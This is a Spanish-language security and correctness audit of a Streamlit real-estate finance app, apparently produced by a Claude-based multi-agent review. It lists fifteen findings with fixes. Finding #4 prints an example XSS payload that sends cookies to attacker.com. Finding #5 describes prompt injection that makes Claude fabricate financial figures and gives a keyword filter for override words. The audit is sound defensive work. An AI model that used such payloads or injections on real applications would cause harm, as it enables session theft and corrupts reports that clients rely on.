# AUDITORÍA DE CÓDIGO SOLUM — Junio 2026
## 15 hallazgos ordenados por severidad
### Generado por revisión multi-agente (ultrareview local)

---

## CRÍTICOS — Resolver antes de cualquier cliente externo

### #1 — SEGURIDAD CRÍTICA | app.py línea 750
**Contraseñas hasheadas con SHA-256 puro sin salt**

```python
# CÓDIGO ACTUAL (INSEGURO):
def _hash_pw(pw: str) -> str:
    return hashlib.sha256(pw.encode()).hexdigest()

# FIX:
import hashlib, os
def _hash_pw(pw: str, salt: bytes = None) -> str:
    if salt is None:
        salt = os.urandom(32)
    key = hashlib.pbkdf2_hmac('sha256', pw.encode(), salt, 100_000)
    return salt.hex() + ':' + key.hex()
```

**Impacto:** Si st.secrets.toml es expuesto, todas las contraseñas son crackeables en segundos con GPU usando rainbow tables. SHA-256 sin salt no es un KDF. Riesgo material para clientes institucionales.

---

### #2 — SEGURIDAD CRÍTICA | app.py línea 641
**_show_shared_view() fallback hace SELECT * sin filtro — expone toda la base de datos**

```python
# CÓDIGO ACTUAL (PELIGROSO):
r2 = sb.table("proyectos").select("*").execute()  # SIN filtro de usuario
for row in (r2.data or []):
    if (row.get("datos") or {}).get("_share_token") == token:

# FIX:
r2 = sb.table("proyectos").select("id,datos").filter(
    "datos->>_share_token", "eq", token
).execute()
proyecto = (r2.data or [None])[0]
```

**Impacto:** Cualquier request con token inválido desencadena un fetch de TODOS los proyectos de todos los usuarios. Con RLS desactivado en Supabase, es data exposure total.

---

### #3 — SEGURIDAD ALTA | app.py línea 143
**cargar_proyecto() sin verificación de ownership — cualquier usuario lee proyectos ajenos**

```python
# CÓDIGO ACTUAL (INSEGURO):
resp = sb.table("proyectos").select("datos").eq("id", ref._id).single().execute()

# FIX — agregar filtro de usuario:
usuario = st.session_state.get("_username", "")
resp = sb.table("proyectos").select("datos") \
    .eq("id", ref._id) \
    .eq("usuario", usuario) \
    .single().execute()
```

**Impacto:** Usuario con UUID de proyecto ajeno (obtenible desde un link compartido) accede a datos financieros y legales confidenciales de otro cliente.

---

### #4 — SEGURIDAD ALTA | app.py líneas 7332–7334
**HTML injection en generar_propuesta_html — campos de usuario sin html.escape()**

```python
# CÓDIGO ACTUAL (VULNERABLE):
f"<td>{propietario}</td>"
f"<p>{condiciones}</p>"

# FIX:
import html
f"<td>{html.escape(propietario)}</td>"
f"<p>{html.escape(condiciones)}</p>"
```

**Impacto:** Usuario escribe `<script>fetch('https://attacker.com?c='+document.cookie)</script>` en campo Propietario. Script ejecuta en iframe de st.components.v1.html().

---

### #5 — SEGURIDAD ALTA | app.py líneas 3522, 4009, 4265
**Prompt injection via campo 'sugerencias' — concatenado verbatim a prompts de Claude**

```python
# CÓDIGO ACTUAL (VULNERABLE):
prompt += f"\n\nNOTAS DEL ANALISTA:\n{sugerencias.strip()}"

# FIX — sanitizar y limitar:
MAX_SUGERENCIAS = 500
sugerencias_safe = sugerencias.strip()[:MAX_SUGERENCIAS]
# Remover patrones de inyección comunes:
sugerencias_safe = re.sub(r'(?i)(ignore|ignora|forget|olvida|system|assistant)', '[redacted]', sugerencias_safe)
prompt += f"\n\nNOTAS DEL ANALISTA (contexto adicional del usuario):\n{sugerencias_safe}"
```

**Impacto:** Usuario adversarial escribe instrucciones que overridean el JSON schema. Claude devuelve cabida fabricada con pisos_max=99 que parece plausible y corrompe el análisis financiero silenciosamente.

---

### #6 — SEGURIDAD ALTA | app.py línea 758
**Login sin protección de fuerza bruta — intentos ilimitados**

```python
# FIX — agregar contador en session_state:
MAX_INTENTOS = 5
BLOQUEO_SEGUNDOS = 300

if st.session_state.get("_login_bloqueado_hasta", 0) > time.time():
    st.error(f"Cuenta bloqueada. Intente en {int(st.session_state['_login_bloqueado_hasta'] - time.time())} segundos.")
    st.stop()

if not autenticado:
    intentos = st.session_state.get("_login_intentos", 0) + 1
    st.session_state["_login_intentos"] = intentos
    if intentos >= MAX_INTENTOS:
        st.session_state["_login_bloqueado_hasta"] = time.time() + BLOQUEO_SEGUNDOS
```

**Impacto:** Con ~4 usuarios conocidos, un script automatizado completa un ataque de diccionario en segundos sin ningún bloqueo.

---

## ALTOS — Correctitud financiera

### #7 — FINANCIERO ALTO | app.py líneas 274, 342–346
**calcular_industrial(): tasa promedio aritmética para saldo_deuda terminal — IRR incorrecto**

```python
# CÓDIGO ACTUAL (INCORRECTO):
tasa_anual = (tasa_terreno + tasa_const) / 2  # línea 274
# ... líneas 342-346: saldo calculado con tasa promedio sobre deuda combinada

# FIX — calcular saldo de cada crédito por separado:
def _saldo_credito(principal, tasa_anual, plazo_anos, cuota_mensual, yr):
    if principal <= 0 or yr > plazo_anos:
        return 0.0
    r = tasa_anual / 12
    n = yr * 12
    return max(principal * (1+r)**n - cuota_mensual * ((1+r)**n - 1) / r, 0)

saldo_terreno = _saldo_credito(monto_credito_terreno, tasa_terreno, plazo_terreno, cuota_terreno, yr)
saldo_const   = _saldo_credito(monto_credito_const,   tasa_const,   plazo_const,   cuota_const,   yr)
saldo_deuda   = saldo_terreno + saldo_const
```

**Impacto:** Con crédito terreno 6%/10 años y construcción 10%/8 años, el saldo al año 8 (cuando construcción ya está pagado) es incorrecto. IRR puede desviarse 1-3 puntos porcentuales — número que se presenta a fondos y bancos.

---

### #8 — FINANCIERO ALTO | app.py líneas 4335–4337
**c_financiero usa _meses_obra_prel (auto) antes de aplicar meses_obra_override del usuario**

```python
# CÓDIGO ACTUAL (BUG — c_financiero calculado con valor incorrecto):
_meses_obra_prel = 24 if _n_pisos_prelim > 20 else (12 if _n_pisos_prelim <= 5 else 16)  # línea 4336
c_financiero = c_construccion * 0.75 * fin.get("tasa_financ", 9.0) / 100 * (_meses_obra_prel / 12)  # línea 4337
# ... 40 líneas después se calcula el valor correcto:
meses_obra = int(fin.get("meses_obra_override") or _obra_auto)  # línea 4377

# FIX — mover c_financiero DESPUÉS de calcular meses_obra:
# Primero calcular meses_obra con override:
_obra_auto = 24 if num_pisos > 20 else (12 if num_pisos <= 5 else 16)
meses_obra = max(1, min(int(fin.get("meses_obra_override") or _obra_auto), 60))
# Luego calcular c_financiero con el valor correcto:
c_financiero = c_construccion * 0.75 * fin.get("tasa_financ", 9.0) / 100 * (meses_obra / 12)
```

**Impacto:** Usuario con override de 24 meses en proyecto de 5 pisos (default 12m). c_financiero usa 12 meses, DCF usa 24. Margen en PDF es ~6% más optimista que el flujo real. Números inconsistentes presentados al banco.

---

### #9 — FUNCIONAL ALTO | app.py líneas 8762–8764
**Archivos subidos a 'Docs de referencia' tienen bytes descartados — nunca llegan a Claude**

```python
# CÓDIGO ACTUAL (BUG — solo guarda nombre y tamaño, descarta contenido):
ref_docs_inm_bytes = [{"name": f.name, "size": len(f.read())} for f in ref_docs_inm]
# ref_docs_inm_bytes NUNCA se pasa a extract_parameters() ni generate_cabida()

# FIX:
ref_docs_inm_bytes = []
for f in ref_docs_inm:
    content = f.read()
    ref_docs_inm_bytes.append({"name": f.name, "size": len(content), "bytes": content})

# Y pasarlos en la llamada a extract_parameters():
# norm_docs_extra = [item["bytes"] for item in ref_docs_inm_bytes]
```

**Impacto:** Usuario sube plano perimétrico, ordenanza distrital o cualquier documento de referencia esperando que influya en el análisis. Claude nunca los ve. El uploader es visualmente activo pero funcionalmente inútil.

---

## MEDIOS — Integridad de datos y UX

### #10 — INTEGRIDAD MEDIA | app.py línea 10587
**st.session_state.financ sobreescrito en cada slider rerun de Tab 3 — PDF y proyecto guardado divergen**

```python
# CÓDIGO ACTUAL (PROBLEMA):
# En Tab 3, se recalcula y sobreescribe financ en cada rerun:
result = calcular_financiero(c, fin_run, zona_sel)
st.session_state.financ = result  # línea 10587-10588

# FIX — separar resultado "comprometido" del "preview en vivo":
# Solo actualizar financ_committed cuando se presiona el botón Analizar:
if st.button("Generar Análisis", key="btn_analizar"):
    st.session_state.financ_committed = calcular_financiero(c, fin_run, zona_sel)

# Para preview de sliders usar clave separada:
st.session_state.financ_preview = calcular_financiero(c, fin_run_live, zona_sel)

# PDF y guardar_proyecto usan financ_committed
```

**Impacto:** Usuario genera análisis → mueve slider de tasa → session_state.financ refleja nueva tasa → descarga PDF → PDF muestra escenario diferente al que estaba viendo. Problema de auditoría si el cliente compara el PDF con la pantalla.

---

### #11 — RACE CONDITION MEDIA | app.py líneas 8916–8922, 9841–9853
**UploadedFile en EOF si ambos botones (Analizar Legal + Generar Análisis) se presionan en el mismo render pass**

```python
# FIX — leer bytes en session_state al momento de upload, no al momento de click:
if pdf_cert:
    if "pdf_cert_bytes" not in st.session_state or st.session_state.get("pdf_cert_name") != pdf_cert.name:
        st.session_state["pdf_cert_bytes"] = pdf_cert.read()
        st.session_state["pdf_cert_name"] = pdf_cert.name

# Usar st.session_state["pdf_cert_bytes"] en lugar de pdf_cert.read() en todos los handlers
```

**Impacto:** Click rápido de ambos botones en el mismo rerun deja el UploadedFile en EOF. El segundo read() devuelve b"". Claude recibe PDF vacío y lanza json_parse_error que parece error de API.

---

### #12 — MANTENIMIENTO MEDIO | app.py líneas 3567–3780
**generate_cabida() tiene dos cadenas if/elif paralelas para los mismos 13 distritos sin fuente de verdad común**

```python
# PROBLEMA: normativa_note chain (líneas 3567-3696) y _area_min_nota chain (líneas 3700-3780)
# son dos if/elif independientes con los mismos distritos

# FIX — unificar en un dict:
_DISTRICT_CONFIG = {
    "san isidro": {
        "normativa": RIN_SAN_ISIDRO + "...",
        "area_min_nota": "ÁREAS MÍNIMAS SAN ISIDRO..."
    },
    "miraflores": {
        "normativa": RIN_MIRAFLORES + "...",
        "area_min_nota": "ÁREAS MÍNIMAS MIRAFLORES..."
    },
    # ... etc
}

distrito_key = next((k for k in _DISTRICT_CONFIG if k in distrito.lower()), None)
if distrito_key:
    cfg = _DISTRICT_CONFIG[distrito_key]
    normativa_note += cfg["normativa"]
    _area_min_nota = cfg["area_min_nota"]
```

**Impacto:** Agregar nuevo distrito requiere editar dos lugares distintos. Un olvido hace que Claude reciba normativa correcta pero áreas mínimas del RNE genérico → genera más unidades de las permitidas → números incorrectos al cliente.

---

## BAJOS — Deuda técnica

### #13 — FRAGILIDAD BAJA | app.py líneas 993–1884
**891 líneas de CSS con 248+ selectores internos de Streamlit re-inyectadas en cada rerun**

**Problema:** Selectores como `[data-testid="stSidebar"]`, `[data-baseweb="tab-list"]` son APIs internas de Streamlit que cambian en cada versión mayor.

**Fix gradual:** Mover estilos de layout críticos a `.streamlit/config.toml` usando el sistema de temas nativo. Eliminar selectores que duplican lo que el tema ya maneja. Mantener solo los overrides realmente necesarios.

**Impacto:** Cualquier `pip install streamlit --upgrade` puede silenciosamente romper sidebar, upload buttons o spinners. El developer debe comparar 891 líneas contra el changelog de Streamlit.

---

### #14 — DEAD CODE BAJA | app.py línea 6797
**_kpi_block() definida en generar_informe_industrial_pdf pero nunca llamada**

```python
# ELIMINAR o DOCUMENTAR claramente:
# def _kpi_block(items):  # ← nunca usada, _kpi_col_tbl() se usa en su lugar
```

**Impacto:** Si un developer intenta usar _kpi_block() como reuso aparente, reportlab lanza error de layout en producción al generar informes industriales.

---

### #15 — SIDE EFFECT BAJA | app.py líneas 3129–3147
**get_mercado() muta TIPO_CAMBIO como variable global con side-effect no cacheado**

```python
# CÓDIGO ACTUAL:
def get_mercado() -> dict:
    global TIPO_CAMBIO  # ← side effect peligroso
    sheet_data = _cargar_mercado_sheet()
    TIPO_CAMBIO = sheet_data.get("tipo_cambio", TIPO_CAMBIO)
    ...

# FIX:
@st.cache_data(ttl=3600)
def get_mercado_y_tc() -> tuple[dict, float]:
    sheet_data = _cargar_mercado_sheet()
    tc = sheet_data.get("tipo_cambio", 3.75)
    mercado = {**MERCADO_BASE, **sheet_data}
    return mercado, tc

MERCADO, TIPO_CAMBIO = get_mercado_y_tc()
```

**Impacto:** Si get_mercado() es llamado más de una vez en la sesión (botón refresh), TIPO_CAMBIO puede quedar desincronizado de MERCADO. Conversiones USD/PEN usan tipo de cambio equivocado silenciosamente.

---

## PRIORIDAD DE RESOLUCIÓN

| # | Severidad | Tiempo estimado fix | Impacto si no se corrige |
|---|---|---|---|
| 1 | CRÍTICA | 2 horas | Todas las contraseñas comprometidas en leak |
| 2 | CRÍTICA | 1 hora | Data exposure total en shared view |
| 3 | CRÍTICA | 30 min | IDOR — acceso a proyectos ajenos |
| 4 | ALTA | 2 horas | XSS en propuesta HTML |
| 5 | ALTA | 1 hora | Prompt injection — análisis falsificado |
| 6 | ALTA | 2 horas | Fuerza bruta en login |
| 7 | ALTA | 3 horas | IRR incorrecto en módulo industrial |
| 8 | ALTA | 1 hora | Costo financiero ignora override usuario |
| 9 | ALTA | 1 hora | Docs referencia nunca llegan a Claude |
| 10 | MEDIA | 2 horas | PDF y proyecto guardado con números distintos |
| 11 | MEDIA | 2 horas | Race condition en uploads |
| 12 | MEDIA | 4 horas | Desincronización silenciosa de normativa |
| 13 | BAJA | Gradual | CSS se rompe en updates de Streamlit |
| 14 | BAJA | 15 min | Eliminar dead code |
| 15 | BAJA | 1 hora | Tipo de cambio desincronizado |

**Total estimado para resolver #1-#9 (críticos + altos):** ~16 horas de desarrollo

---

*Auditoría generada el 2 de junio de 2026 por revisión multi-agente local de Claude Sonnet 4.6*
*Archivo: /FACTIS/AUDITORIA_SOLUM_2026.md*
